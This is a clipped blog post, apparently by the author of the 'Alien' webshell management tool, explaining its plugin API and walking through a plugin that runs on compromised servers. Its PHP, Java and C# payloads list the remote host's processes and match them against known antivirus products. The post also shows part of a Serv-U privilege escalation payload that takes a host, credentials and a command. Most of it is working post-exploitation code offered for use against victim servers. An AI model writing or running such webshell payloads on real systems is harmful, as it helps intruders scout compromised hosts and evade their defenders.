---
title: "[Alien] How to Develop A Plugin | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/07/27/2026-7-27-AlienPlugin/
source_host: iss4cf0ng.github.io
clip_date: 2026-09-29T10:28:57+08:00
trace_id: 419064ab-c3c8-498f-85e4-3dee3d89d22d
content_hash: 23531500173164144aa18c07a23b1c7baac5b7ddb043466b35015fdbca04e01f
status: synced
tags:
  - 安全工具
  - 协议分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: Alien v5.0.0 的插件体系基于嵌入式 WebView，UI 用 HTML/JavaScript 编写，通过原生桥接 API 调用载荷，可在远端 webshell 上执行代码并处理结果。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3ea75244-d011-818d-9577-d57cfceae21c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Alien v5.0.0 的插件体系基于嵌入式 WebView，UI 用 HTML/JavaScript 编写，通过原生桥接 API 调用载荷，可在远端 webshell 上执行代码并处理结果。
> 
> - **架构核心：** 插件运行在嵌入式浏览器中，Alien 暴露 API 桥接 WebView 与 C# 主程序，载荷本质是 `eval()` 或反射加载的高级形式。
> - **目录结构：** 插件需含 `index.html`（UI）、`manifest.json`（信息）和 `payloads/`（按环境分层存放载荷与源码）。
> - **环境字符串：** 由 `fnGetShellType()` 返回（如 `PHP/v8.X/OneShell`、`JSP/NebulaPulsar/DarkMatter`），决定插件是否可用及载荷目录；需同时出现在 manifest 与 JS 校验列表中。
> - **关键 API：** `fnGetPayload` 加载载荷（NebulaPulsar 环境返回 Base64 二进制）、`fnReadFileText`/`fnReadFileBytes` 读文件、`fnRun` 在远端执行载荷并返回原始输出。
> - **开发要点：** Alien 启动时递归扫描 `./Plugins/`，发现 `manifest.json` 即视为插件；WebView 始终加载 `index.html`；带参数的载荷须用 POST 参数接收 JSON 配置且不能使用 `z0` 字段名。

## Introduction

A few days ago, I published Alien v5.0.0. After that, I took some time to get some rest (well… I had been dealing with too many things, including sleep problems).

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b730ebad7dc0dda9.jpg)

In this article, I will introduce the plugin framework of Alien and demonstrate how to develop a custom plugin.

## Why Plugins?

A plugin architecture is one of the most essential components of a modern offensive security tool because it improves extensibility and extends the lifespan of the framework.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f1207b4ee1ccfd79.jpg)

Many well-known offensive security tools, including Cobalt Strike, Ghidra, IDA Pro, and DanderSpritz, provide plugin architectures. Plugins can be used to target different servers, web applications, databases, and content management systems (CMS), including Apache, Nginx, IIS, phpMyAdmin, MySQL, and WordPress.

## How Alien Plugins Work

The core of the plugin system is an embedded WebView. The WebView in **Control Panel** loads the UI (mainly written in HTML) of a plugin. The UI logic is implemented in JavaScript. In other words, all plugins run in an embedded web browser.

Plugin

JavaScript

Bridge

Alien

Payload

Victim

Alien exposes a set of APIs that bridge the embedded browser and the native application. Therefore, plugins can read additional payload files (such as DLLs or class files) through the provided APIs.

The payload executed by a plugin is essentially an advanced form of `eval()`. Languages such as PHP and Classic ASP execute payloads through `eval()`, while Java and.NET rely on reflective loading.

The overall hierarchy of a plugin is shown below:

```cpp
├── index.html                      // Plugin's UI
├── manifest.json                   // Information JSON
└── payloads                        // payload directory
    └── JSP
        └── NebulaPulsar
            └── DarkMatter
                ├── payload.class   // payload file
                └── payload.java    // payload source code
```

## APIs

Alien exposes the following APIs:

### fnGetShellType

```
fnGetShellType()
```

Returns the environment string of the current webshell.

The environment string is used to determine whether a plugin supports the current shell and to locate the corresponding payload directory.

For example:

```
PHP/v8.X/OneShell
JSP/NebulaPulsar/DarkMatter
```

A plugin is available only if the returned `environment` exists in the `environment` field of manifest.json.

### fnGetPayload

```
public string fnGetPayload(
    string szDirName,
    string szEnv,
    string szName
)
```

Loads a payload from the plugin directory.

Parameters:

-   **szDirName**— Plugin directory.
-   **szEnv**— Current environment string.
-   **szName**— Payload file name without its extension.

Returns:

-   The payload as plain text. If the current environment is NebulaPulsar, the payload is returned as a Base64-encoded binary.

### fnReadFileText

```
public string fnReadFileText(
    string szFilePath
)
```

Reads the specified text file.

Parameters:

-   **szFilePath**— Path to the file.

Returns:

-   File contents as a string

### fnReadFileBytes

```
public string fnReadFileBytes(
    string szFilePath
)
```

Reads the specified file as binary data and returns it as a Base64-encoded string.

Parameters:

-   **szFilePath**— Path to the file.

Returns:

-   File contents encoded as Base64.

### fnRun

```typescript
public async Task<string> fnRun(
    string szJson,
    string szPayload,
    string szEnvironment
)
```

Executes the specified payload on the remote server.

Parameters:

-   **szJson**— JSON configuration passed to the payload.
-   **szPayload**— Payload source code or binary.
-   **szEnvironment**— Environment string of the current webshell.

Returns:

-   The raw output returned by the payload.

## Developing a Plugin

In this section, I am going to show how to write a plugin to detect any anti-virus software on the remote server. The core idea is to obtain all running processes from the remote server and compare them against a database of known anti-virus software.

First, create a new directory `Anti-Virus`, then we need a `manifest.json` to configure the information of a plugin:

```json
{
    "name": "Anti-Virus",
    "version": "1.0",
    "author": "iss4cf0ng/ISSAC",
    "environment": [
        "PHP/v5.X/OneShell",
        "PHP/v7.X/OneShell",
        "PHP/v8.X/OneShell",
        "ASP/Classic/OneShell",
        "ASPX/JScript/OneShell",
        "JSP/NebulaPulsar/DarkMatter"
    ],
    "description": "Scan all Anti-Virus."
}
```

All fields shown above are required. Among these fields, `environment` is the most important. The environment string serves two purposes:

-   It determines whether the plugin is compatible with the current webshell.
-   It determines where the corresponding payload is located.

For instance, if the environment of the current webshell is `PHP/v8.X/OneShell`, the payload can be loaded in JavaScript as follows:

```javascript
// PHP/v8.X/OneShell
let currentShellType = await bridge.fnGetShellType();

// Object for bridging WebView and C# application
const bridge = window.chrome.webview.hostObjects.nativeBridge;

// Current directory of the HTML (Value of browser URL)
const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);

// Payload code. If environment (ShellType) is NebulaPulsar, it returns a Base64-encoded bytes
const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
```

Alien recursively scans the `./Plugins/` directory during startup. Whenever a `manifest.json` file is found, the directory is treated as a plugin. The recursion stops once a directory containing `manifest.json` is found.

Regardless of whether `manifest.json` exists, the WebView always loads `index.html`. Therefore, `index.html` can either serve as the user interface of a plugin or simply as an easter egg inside directory!

In addition, each plugin performs an additional validation in JavaScript:

```javascript
const pluginManifest = {
    "supportedLangs": [
        "ASP/Classic/OneShell",
        "ASHX/JScript/OneShell",
        "ASMX/JScript/OneShell",
        "ASPX/JScript/OneShell",
        "ASPX/NebulaPulsar/DarkMatter",
        "PHP/v5.X/OneShell",
        "PHP/v7.X/OneShell",
        "PHP/v8.X/OneShell",
        "JSP/NebulaPulsar/DarkMatter",
    ]
};
```

A plugin won’t be available if the environment string is not in the list.

Now, let’s return to our plugin and create the payload file: `PHP/v8.X/OneShell/payload.php`:

```php
<?php

header('Content-Type: application/json; charset=utf-8');

exec('tasklist /NH /FO CSV', $outputLines);

$processes = [];

foreach ($outputLines as $line) {
    $data = str_getcsv($line);
    
    if (isset($data[0])) {
        $processes[] = trim($data[0]); 
    }
}

echo json_encode($processes);

?>
```

In this case, we don’t have any input parameter. However, if we do, then the JSON configuration must be received through an HTTP POST parameter and **CANNOT** be `z0`:

```php
// payload of Serv-U privilege escalation

$json_pattern = json_decode(base64_decode($_POST['z1']), true);
$host = $json_pattern["ip"];
$port = (int)$json_pattern["port"];
$user = $json_pattern["user"];
$pass = $json_pattern["pass"];
$cmd = $json_pattern["cmd"];
```

Once everything is in place, we can handle the returned data of payload execution. Therefore, the execution method in JavaScript can be implemented as follows:

```javascript
async function executePlugin() {
    const jsonConfig = document.getElementById('targetJson').value;

    appendLog(`[*] ALLOCATING INVENTORY PAYLOAD FOR: ${currentShellType.toUpperCase()}`);

    const bridge = window.chrome.webview.hostObjects.nativeBridge;
    const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
    
    const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
    appendLog('[*] ENGAGING REMOTE TASKLIST QUERY...');
    
    const tasklistResultRaw = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
    
    appendLog('[+] RECEIVED TASKLIST FROM TARGET NODE.');

    let localJsonPath = currentDir + "av_list.json";
    if (localJsonPath.startsWith("file:///")) {
        localJsonPath = localJsonPath.replace("file:///", "").replace(/\//g, "\\");
    }

    if (localJsonPath.startsWith("/") && localJsonPath.charAt(2) === ':') {
        localJsonPath = localJsonPath.substring(1);
    }
    
    appendLog(`[*] LOADING LOCAL SIGNATURE MATRIX FROM: ${localJsonPath}`);
    const jsonContentRaw = await bridge.fnReadFileText(localJsonPath);

    if (!jsonContentRaw) {
        appendLog("[!] WARNING: LOCAL SIGNATURE FILE IS EMPTY OR NOT FOUND. UNABLE TO PERFORM MATCHING.");
        appendLog("--- RAW TASKLIST OUTPUT ---");
        appendLog(tasklistResultRaw);
        return;
    }

    try {
        const remoteProcesses = JSON.parse(tasklistResultRaw);
        const upperProcessList = Array.isArray(remoteProcesses) ? remoteProcesses.map(p => p.toUpperCase()) : [];

        const avDatabase = JSON.parse(jsonContentRaw); 
        // { "antivirus_list": [ { "name_zh": "...", "process_keywords": [...] }, ... ] }
        
        appendLog("[*] PARSED SIGNATURE DATABASE SUCCESSFULLY. COMMENCING MATCHING...");
        
        let matchCount = 0;

        if (avDatabase && Array.isArray(avDatabase.antivirus_list)) {
            avDatabase.antivirus_list.forEach(av => {
                const avName = av.name;
                if (Array.isArray(av.process_keywords)) {
                    av.process_keywords.forEach(keyword => {
                        
                        if (upperProcessList.includes(keyword.toUpperCase())) {
                            appendLog(`[!] ALERT: DETECTED -> [${keyword}] <=> MATCHED TO: ${avName} (${av.region})`);
                            matchCount++;
                        }
                    });
                }
            });

        } else {
            throw new Error("INVALID JSON FORMAT: MISSING 'antivirus_list' ARRAY.");
        }

        if (matchCount === 0) {
            appendLog("[+] ANALYSIS COMPLETE: NO KNOWN ANTI-VIRUS PROCESSES DETECTED.");
        } else {
            appendLog(`[+] ANALYSIS COMPLETE: DETECTED ${matchCount} CONFLICTING SYSTEM DEFENDERS.`);
        }

    } catch (jsonErr) {
        appendLog("[-] MATRIX PARSE ERROR: FAILED TO PARSE LOCAL JSON CONTENT. " + jsonErr.message.toUpperCase());
        appendLog("--- RAW TASKLIST OUTPUT ---");
        appendLog(tasklistResultRaw);
    }
}
```

If you are not familiar with HTML or JavaScript development, don’t worry! You can simply copy one of the existing plugins and modify only the functionality you need.

Another detail worth mentioning is NebulaPulsar. The main logic has to be implemented in `Execute()`:

```java
public String Execute(Object param) throws Exception {
    List<String> processes = new ArrayList<>();
    
    ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "tasklist /NH /FO CSV");
    processBuilder.redirectErrorStream(true);
    Process process = processBuilder.start();
    
    try (BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
        
        String line;
        while ((line = reader.readLine()) != null) {
            String trimmedLine = line.trim();
            if (trimmedLine.isEmpty()) {
                continue;
            }
            
            String processName = fnParseCsvFirstColumn(trimmedLine);
            
            if (!processName.isEmpty()) {
                processes.add(processName);
            }
        }
    }
    process.waitFor();

    return fnBuildJsonArray(processes);
}
```

```php
public string Execute(object param)
{
    List<string> processes = new List<string>();

    Process[] processList = Process.GetProcesses();
    foreach (Process p in processList)
    {
        try
        {
            string processName = p.ProcessName + ".exe";
            processes.Add(processName);
        }
        catch
        {
            // do something.
        }
    }

    return fnBuildJsonArray(processes);
}
```

## Conclusion

This concludes the introduction to developing plugins for Alien.

I hope this article provides enough information for you to start building your own plugins. Whether they target web applications, databases, or entirely different services, the plugin architecture is designed to remain flexible and extensible.

If you are interested in extending Alien, I encourage you to experiment with the plugin framework and build your own modules. I also plan to develop more official plugins and publish them on GitHub!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/aa320234e9e01d39.png)

In the next article, I will introduce the MemoryShell feature provided by Alien.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0455f18e05abf82d.jpg)
